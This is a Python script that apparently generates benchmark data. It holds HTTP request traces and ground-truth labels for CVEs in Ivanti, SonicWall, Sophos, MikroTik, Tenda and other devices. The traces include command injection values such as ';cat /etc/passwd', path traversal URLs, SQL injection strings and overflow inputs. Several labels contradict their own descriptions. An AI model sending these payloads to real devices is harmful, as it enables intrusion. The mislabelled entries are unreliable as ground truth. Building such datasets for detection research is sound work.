                "headers": {"Content-Type": "application/json"},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"result\":\"success\"}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-46805",
            "reasoning": "Auth bypass via path traversal. /api/v1/totp/user-backup-code/../../ reaches restricted endpoints without auth. Chained with CVE-2024-21887."
        }
    },
    {
        "cve_id": "CVE-2024-8963",
        "vendor": "Ivanti",
        "product": "Cloud Services Appliance",
        "vuln_class": "PT",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/client/index.htm/../../../gsb/reports.php",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "admin interface"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-8963",
            "reasoning": "Path traversal to access admin functionality. Chained with CVE-2024-8190 or CVE-2024-9380 for RCE. Ivanti CSA 4.6."
        }
    },
    {
        "cve_id": "CVE-2024-8190",
        "vendor": "Ivanti",
        "product": "Cloud Services Appliance",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/gsb/DateTimeTab.php",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "PHPSESSID=valid"},
                "body": "TIMEZONE=America;cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": "TIMEZONE",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-8190",
            "reasoning": "Authenticated OS command injection via TIMEZONE parameter. Ivanti CSA 4.6. Chained with CVE-2024-8963 for pre-auth RCE."
        }
    },
    {
        "cve_id": "CVE-2024-9380",
        "vendor": "Ivanti",
        "product": "Cloud Services Appliance",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/gsb/reports.php",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "PHPSESSID=valid"},
                "body": "reportName=test;cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": "reportName",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-9380",
            "reasoning": "OS command injection in reports.php. Authenticated. Ivanti CSA 5.0.1 and prior. Chained with CVE-2024-8963."
        }
    },
    {
        "cve_id": "CVE-2025-0282",
        "vendor": "Ivanti",
        "product": "Connect Secure",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/dana-na/auth/url_default/welcome.cgi",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "username=" + "A" * 16384
            },
            "response": {
                "status_code": 500,
                "headers": {},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": "username",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-0282",
            "reasoning": "Stack-based buffer overflow in Ivanti Connect Secure before 22.7R2.5. Pre-auth RCE. CVSS 9.0."
        }
    },
    {
        "cve_id": "CVE-2025-22457",
        "vendor": "Ivanti",
        "product": "Connect Secure",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/dana-na/auth/url_default/welcome.cgi",
                "params": {"p": "A" * 8192},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 500,
                "headers": {},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": "p",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-22457",
            "reasoning": "Stack-based buffer overflow in Ivanti Connect Secure before 22.7R2.6. Pre-auth RCE exploited by UNC5221 (China-nexus). CVSS 9.0."
        }
    },
    # ===== MikroTik (1) =====
    {
        "cve_id": "CVE-2018-14847",
        "vendor": "MikroTik",
        "product": "RouterOS",
        "vuln_class": "PT",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/jsproxy",
                "params": {},
                "headers": {"Content-Type": "application/octet-stream"},
                "body": "\\x68\\x01\\x00\\x66\\x4d\\x32\\x05\\x00\\xff\\x01\\x06\\x00\\xff\\x09\\x05\\x07\\x00\\xff\\x09\\x07\\x01\\x00\\x00\\x21\\x35\\x2f\\x2f\\x2f\\x2f\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/octet-stream"},
                "body": "admin credentials"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/45578",
            "reasoning": "Winbox protocol path traversal via HTTP /jsproxy endpoint reads arbitrary files. Reads user.dat for credentials. RouterOS before 6.42.7. CVSS 9.1."
        }
    },
    # ===== SonicWall (selected) =====
    {
        "cve_id": "CVE-2021-20016",
        "vendor": "SonicWall",
        "product": "SMA100",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/management",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "extravagant=' OR '1'='1"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "admin session"
            }
        },
        "ground_truth": {
            "sink_param": "extravagant",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-20016",
            "reasoning": "SQL injection in SMA100 management interface. Unauthenticated credential extraction. SMA 100 series."
        }
    },
    {
        "cve_id": "CVE-2021-20035",
        "vendor": "SonicWall",
        "product": "SMA100",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/viewcert",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "swap=valid_session"},
                "body": "ESSION=valid&cert=test;cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": "cert",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-20035",
            "reasoning": "Authenticated command injection in viewcert endpoint. SMA 200, 210, 400, 410, 500v."
        }
    },
    {
        "cve_id": "CVE-2024-40766",
        "vendor": "SonicWall",
        "product": "SonicOS",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/api/sonicos/auth",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"status\":\"success\"}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-40766",
            "reasoning": "Improper access control in SonicOS management and SSLVPN. Unauthorized resource access. Affects Gen 5/6/7 firewalls. CVSS 9.3."
        }
    },
    {
        "cve_id": "CVE-2024-53704",
        "vendor": "SonicWall",
        "product": "SonicOS",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/api/sonicos/auth",
                "params": {},
                "headers": {"Content-Type": "application/json"},
                "body": "{\"user\":\"admin\",\"password\":\"\",\"domain\":\"LocalDomain\",\"override\":false}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json", "Set-Cookie": "SID=valid_session"},
                "body": "{\"status\":\"success\"}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-53704",
            "reasoning": "SSLVPN authentication bypass via crafted session cookie. Hijack active SSL VPN sessions. SonicOS Gen 7."
        }
    },
    # ===== Sophos (selected) =====
    {
        "cve_id": "CVE-2020-12271",
        "vendor": "Sophos",
        "product": "XG Firewall",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/_languagefile/webadmin/en-US/RES_Authentication.js",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "mode=151&json={\"test\":\";cat /etc/passwd\"}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": "json",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-12271",
            "reasoning": "SQL injection leading to RCE (Asnarok Trojan). Pre-auth via User Portal and Webadmin interfaces. Sophos XG Firewall."
        }
    },
    {
        "cve_id": "CVE-2022-1040",
        "vendor": "Sophos",
        "product": "Firewall",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/userportal/webpages/myaccount/login.jsp",
                "params": {},
                "headers": {"Content-Type": "application/json"},
                "body": "{\"username\":\"admin\",\"password\":\"admin\"}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"status\":\"success\"}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-1040",
            "reasoning": "Auth bypass in User Portal and Webadmin allowing RCE. Used by Chinese APT (DriftingCloud). Sophos Firewall v18.5 MR3 and older."
        }
    },
    {
        "cve_id": "CVE-2023-1671",
        "vendor": "Sophos",
        "product": "Web Appliance",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/index.php",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "c=warn&args=test;cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": "args",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-1671",
            "reasoning": "Pre-auth command injection in warn endpoint. Sophos Web Appliance before 4.3.10.4. CVSS 9.8."
        }
    },
    # ===== Reolink (2) =====
    {
        "cve_id": "CVE-2019-11001",
        "vendor": "Reolink",
        "product": "Multiple IP Cameras",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/api.cgi",
                "params": {"cmd": "Login"},
                "headers": {"Content-Type": "application/json"},
                "body": "[{\"cmd\":\"Login\",\"action\":0,\"param\":{\"User\":{\"userName\":\"admin\",\"password\":\";cat /etc/passwd;\"}}}]"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "[{\"cmd\":\"Login\",\"code\":0,\"value\":{\"Token\":{\"name\":\"abc\"}}}]"
            }
        },
        "ground_truth": {
            "sink_param": "password",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2019-11001",
            "reasoning": "Command injection via password field in login API. Reolink RLC-410W, C1 Pro, C2 Pro, and others."
        }
    },
    {
        "cve_id": "CVE-2021-40407",
        "vendor": "Reolink",
        "product": "RLC-410W",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/api.cgi",
                "params": {"cmd": "TestEmail", "token": "valid_token"},
                "headers": {"Content-Type": "application/json"},
                "body": "[{\"cmd\":\"TestEmail\",\"action\":0,\"param\":{\"Email\":{\"nickName\":\"test;cat /etc/passwd;\",\"smtpServer\":\"smtp.test.com\"}}}]"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "[{\"cmd\":\"TestEmail\",\"code\":0}]"
            }
        },
        "ground_truth": {
            "sink_param": "nickName",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-40407",
            "reasoning": "Authenticated OS command injection via TestEmail nickName parameter. Talos-2021-1386. RLC-410W firmware v3.0.0.136."
        }
    },
    # ===== Other well-known =====
    {
        "cve_id": "CVE-2019-3929",
        "vendor": "Crestron",
        "product": "Multiple Products",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/login.cgi",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "lang=en&src=websettings/index&dst=../../opt/crestron/bin/&cmd=cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": "cmd",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2019-3929",
            "reasoning": "Unauthenticated command injection via login.cgi. Affects Crestron AM-100/AM-101 and multiple Barco, Extron, InFocus, Teq AV products."
        }
    },
    {
        "cve_id": "CVE-2010-5330",
        "vendor": "Ubiquiti",
        "product": "AirOS",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/admin.cgi/sd.cfg",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "uri=/admin.cgi&ui.cgi.admin.passwd=;cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "ui.cgi.admin.passwd",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2010-5330",
            "reasoning": "Command injection via admin.cgi password change functionality. Ubiquiti AirOS before 5.3.5."
        }
    },
    {
        "cve_id": "CVE-2021-20090",
        "vendor": "Arcadyan",
        "product": "Buffalo Firmware",
        "vuln_class": "PT",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/images/..%2finfo.html",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "Device Information"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-20090",
            "reasoning": "Path traversal via URL encoding bypass (%2f). Bypass authentication to access admin pages. Affects 20+ ISP router brands using Arcadyan firmware."
        }
    },
    {
        "cve_id": "CVE-2023-52163",
        "vendor": "Digiever",
        "product": "DS-2105 Pro",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/cgi-bin/cgi_main.cgi",
                "params": {"action": "storage_test_powerful", "ip": ";cat /etc/passwd"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "ip",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-52163",
            "reasoning": "Command injection via time_tzsetup.cgi / cgi_main.cgi ip parameter. No auth required. Exploited by Mirai-based Hail Cock botnet."
        }
    },
    {
        "cve_id": "CVE-2024-6047",
        "vendor": "GeoVision",
        "product": "Multiple Devices",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/DateSetting.cgi",
                "params": {"szSrvIpAddr": ";cat /etc/passwd"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "szSrvIpAddr",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-6047",
            "reasoning": "Command injection in NTP server address parameter. GeoVision EoL IP cameras. Actively exploited by botnets."
        }
    },
    {
        "cve_id": "CVE-2024-11120",
        "vendor": "GeoVision",
        "product": "Multiple Devices",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/DateSetting.cgi",
                "params": {"szSrvIpAddr": "test;cat /etc/passwd;"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "szSrvIpAddr",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-11120",
            "reasoning": "Similar to CVE-2024-6047 but different affected models. Pre-auth OS command injection. GeoVision EoL devices."
        }
    },
    {
        "cve_id": "CVE-2020-5722",
        "vendor": "Grandstream",
        "product": "UCM6200",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "action=callAction&dest=1234&user=1000' OR 1=1--"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "success"
            }
        },
        "ground_truth": {
            "sink_param": "user",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-5722",
            "reasoning": "SQL injection in Grandstream UCM6200 series IP PBX. Pre-auth. Can extract admin credentials. CVSS 9.8."
        }
    },
    {
        "cve_id": "CVE-2025-1316",
        "vendor": "Edimax",
        "product": "IC-7100",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/camera-cgi/admin/param.cgi",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded", "Authorization": "Basic YWRtaW46MTIzNA=="},
                "body": "action=update&ipcamSource=0&NTP_enable=1&NTP_server=;cat /etc/passwd;"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "NTP_server",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-1316",
            "reasoning": "Command injection via NTP server configuration. Requires auth (default admin:1234). Edimax IC-7100 EoL camera. Exploited by botnets."
        }
    },
    {
        "cve_id": "CVE-2023-25717",
        "vendor": "Ruckus Wireless",
        "product": "Multiple Products",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/forms/do498498Login",
                "params": {"username": "admin", "password": "admin", "ok": "OK"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-25717",
            "reasoning": "Unauthenticated RCE via crafted HTTP request to web services. Ruckus AP, controllers. Actively exploited by AndoryuBot."
        }
    },
    # ===== Tenda (3) =====
    {
        "cve_id": "CVE-2018-14558",
        "vendor": "Tenda",
        "product": "AC7/AC9/AC10",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/goform/setUsbUnload",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "deviceName=A;cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "deviceName",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2018-14558",
            "reasoning": "Command injection via setUsbUnload deviceName parameter in Tenda AC7/AC9/AC10 routers."
        }
    },
    {
        "cve_id": "CVE-2020-10987",
        "vendor": "Tenda",
        "product": "AC15",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/goform/setUsbUnload",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "deviceName=A;cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "deviceName",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-10987",
            "reasoning": "Command injection in setUsbUnload/formSetFirewallCfg. Tenda AC15 v15.03.1.16. Multiple endpoints vulnerable."
        }
    },
    {
        "cve_id": "CVE-2021-31755",
        "vendor": "Tenda",
        "product": "AC11",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/goform/setMacFilterCfg",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "deviceList=" + "A" * 4096
            },
            "response": {
                "status_code": 500,
                "headers": {},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": "deviceList",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-31755",
            "reasoning": "Stack buffer overflow via oversized deviceList parameter. Tenda AC11 v02.03.01.104_CN. Leads to RCE."
        }
    },
]


def generate_traces():
    os.makedirs(TRACE_DIR, exist_ok=True)

    with open(GT_PATH, encoding="utf-8") as f:
        existing_gt = json.load(f)
    existing_cves = {e["cve_id"] for e in existing_gt}

    new_gt_entries = []
    created = 0
    skipped = 0

    for entry in TRACES:
        cve_id = entry["cve_id"]
        trace_path = os.path.join(TRACE_DIR, f"{cve_id}.json")

        if os.path.exists(trace_path):
            skipped += 1
            continue

        trace_json = {
            "cve_id": cve_id,
            "vendor": entry.get("vendor", ""),
            "product": entry.get("product", ""),
            "vuln_class": entry.get("vuln_class", ""),
            "trace": entry["trace"],
        }

        with open(trace_path, "w", encoding="utf-8") as f:
            json.dump(trace_json, f, indent=2, ensure_ascii=False)

        if cve_id not in existing_cves:
            gt = entry.get("ground_truth", {})
            gt_entry = {
                "cve_id": cve_id,
                "vuln_class": entry.get("vuln_class", ""),
                "sink_param": gt.get("sink_param"),
                "payload_encoding": gt.get("payload_encoding", "none"),
                "payload_extraction": gt.get("payload_extraction", "direct"),
                "method": entry["trace"]["request"]["method"],
                "endpoint": entry["trace"]["request"]["path"],
                "source": gt.get("source", ""),
                "reasoning": gt.get("reasoning", ""),
            }
            new_gt_entries.append(gt_entry)

        created += 1

    if new_gt_entries:
        existing_gt.extend(new_gt_entries)
        with open(GT_PATH, "w", encoding="utf-8") as f:
            json.dump(existing_gt, f, indent=2, ensure_ascii=False)

    print(f"Created: {created}, Skipped (existing): {skipped}, New GT entries: {len(new_gt_entries)}")
    print(f"Total traces: {len(os.listdir(TRACE_DIR))}")
    print(f"Total GT entries: {len(existing_gt)}")


if __name__ == "__main__":
    generate_traces()
